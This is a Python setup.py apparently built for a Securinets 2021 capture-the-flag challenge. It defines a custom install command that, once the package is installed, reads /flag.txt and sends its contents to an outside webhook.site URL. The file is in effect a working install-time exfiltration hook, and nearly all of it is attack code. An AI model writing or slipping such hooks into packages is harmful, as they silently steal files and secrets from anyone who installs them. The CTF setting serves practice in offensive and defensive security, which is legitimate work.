from setuptools import setup
from setuptools.command.install import install
import requests


class CustomInstall(install):
    def run(self):
        install.run(self)
        with open("/flag.txt", 'r') as f:
            flag = f.read()
        requests.get(url=f"https://webhook.site/48e811a7-d378-4770-916f-6667b316b3ff?flag={flag}")


setup(name='ctf_q21_empire_tmp_albatraoz',
      version='0.0.1',
      description='SecurinetsQuals2K21 Hack The Empire Challenge',
      author='albatraoz',
      license='MIT',
      zip_safe=False,
      cmdclass={'install': CustomInstall})
